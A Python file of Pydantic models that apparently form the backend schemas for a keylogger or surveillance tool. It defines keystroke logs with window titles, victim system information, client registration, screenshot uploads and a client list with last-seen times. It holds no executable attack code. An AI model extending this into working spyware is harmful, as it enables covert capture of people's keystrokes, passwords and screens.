from pydantic import BaseModel, Field
from typing import List, Optional
from datetime import datetime

class KeyLogEntry(BaseModel):
    timestamp: datetime
    window_title: str
    key_data: str

class SystemInfo(BaseModel):
    computer_name: Optional[str] = None
    user_name: Optional[str] = None
    os_version: Optional[str] = None
    memory_size: Optional[int] = None
    processor_info: Optional[str] = None
    disk_size: Optional[int] = None
    network_info: Optional[str] = None

class ClientRegistration(BaseModel):
    client_id: str
    computer_name: Optional[str] = None
    user_name: Optional[str] = None
    os_version: Optional[str] = None

class KeyLogData(BaseModel):
    client_id: str
    entries: List[KeyLogEntry]
    encrypted: bool = False

class SystemData(BaseModel):
    client_id: str
    data: SystemInfo
    encrypted: bool = False

class ScreenshotData(BaseModel):
    client_id: str
    image_data: str  # Base64 encoded
    encrypted: bool = False

class AuthResponse(BaseModel):
    access_token: str
    token_type: str = "bearer"

class ClientInfo(BaseModel):
    id: str
    computer_name: Optional[str] = None
    user_name: Optional[str] = None
    os_version: Optional[str] = None
    last_seen: datetime
    created_at: datetime

class KeyLogInfo(BaseModel):
    timestamp: datetime
    window_title: str
    key_data: str